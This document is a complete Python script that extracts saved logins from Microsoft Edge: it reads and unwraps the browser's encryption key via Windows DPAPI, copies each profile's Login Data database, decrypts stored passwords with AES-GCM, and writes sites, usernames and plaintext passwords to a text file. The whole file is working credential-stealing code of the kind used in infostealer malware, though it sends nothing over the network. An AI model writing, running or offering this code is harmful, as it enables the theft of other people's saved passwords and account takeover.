import os
import json
import base64
import sqlite3
import shutil
from datetime import datetime, timedelta
from Crypto.Cipher import AES
import win32crypt

def get_edge_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Microsoft", "Edge",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def main():
    profiles = ["Default", "Profile 1", "Profile 2", "Profile 3"]  # Update with Edge profile names
    output_file_path = os.path.join(os.path.dirname(__file__), "edge_data.txt")  # Rename the output file

    with open(output_file_path, "w", encoding="utf-8") as output_file:
        for profile_name in profiles:
            key = get_encryption_key()
            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                   "Microsoft", "Edge", "User Data", profile_name, "Login Data")  # Update Edge database path
            if not os.path.exists(db_path):
                print(f"Database not found for profile: {profile_name}")
                continue
            filename = f"EdgeData_{profile_name}.db"  # Rename the copied database file
            shutil.copyfile(db_path, filename)
            db = sqlite3.connect(filename)
            cursor = db.cursor()
            cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")
            for row in cursor.fetchall():
                origin_url = row[0]
                action_url = row[1]
                username = row[2]
                password = decrypt_password(row[3], key)
                date_created = row[4]
                date_last_used = row[5]
                if username or password:
                    output_file.write(f"Profile: {profile_name}\n")
                    output_file.write(f"Origin URL: {origin_url}\n")
                    output_file.write(f"Action URL: {action_url}\n")
                    output_file.write(f"Username: {username}\n")
                    output_file.write(f"Password: {password}\n")
                else:
                    continue
                if date_created != 86400000000 and date_created:
                    output_file.write(f"Creation date: {str(get_edge_datetime(date_created))}\n")
                if date_last_used != 86400000000 and date_last_used:
                    output_file.write(f"Last Used: {str(get_edge_datetime(date_last_used))}\n")
                output_file.write("=" * 50 + "\n")
            cursor.close()
            db.close()
            try:
                os.remove(filename)
            except:
                pass

if __name__ == "__main__":
    main()